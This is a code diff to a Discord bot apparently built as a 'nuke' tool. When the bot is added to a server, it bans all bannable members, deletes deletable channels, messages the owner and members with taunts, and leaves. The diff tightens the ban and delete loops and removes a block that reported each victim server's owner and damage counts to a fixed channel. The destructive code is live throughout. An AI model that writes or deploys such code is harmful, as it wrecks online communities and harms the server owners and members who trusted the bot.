@@ -9,13 +9,17 @@ client.on('ready', () => {
 
 async function nuke(guild, users = 0, channels = 0) {
   await guild.members.forEach(x => { 
-    x.send('You\'re getting banned! Nothing personal...');
-    if(x.bannable) x.ban(); 
-    return users++;
+    if(x.bannable) { 
+      x.ban(); 
+      x.send('You\'re getting banned! Nothing personal...');
+      return users++;
+    }
   });
   await guild.channels.forEach(x => { 
-    if(x.deletable) x.delete();
-    return channels++;
+    if(x.deletable) {
+      x.delete();
+      return channels++;
+    }
   });
   await guild.owner.sendMessage('Hey there! Your guild is getting nuked! :D');
   await guild.defaultChannel.send('Dumbass, we said not to add the bot...');
@@ -27,13 +31,6 @@ client.on('guildCreate', async (guild) => {
   let embed = new RichEmbed();
 
   await nuke(guild, users, channels);
-
-  if(users > 0 || channels > 0) {
-    embed.setAuthor(`Victim |  ${guild.name}`, guild.iconURL)
-          .setColor(3447003)
-          .setDescription(`Owner - ${guild.owner.user.username}#${guild.owner.user.discriminator} (${guild.owner.id})\nBanned - ${users} users\nDeleted - ${channels} channels`);
-    client.channels.get('274770009883148288').sendEmbed(embed);
-  }
   guild.leave();
 });
 
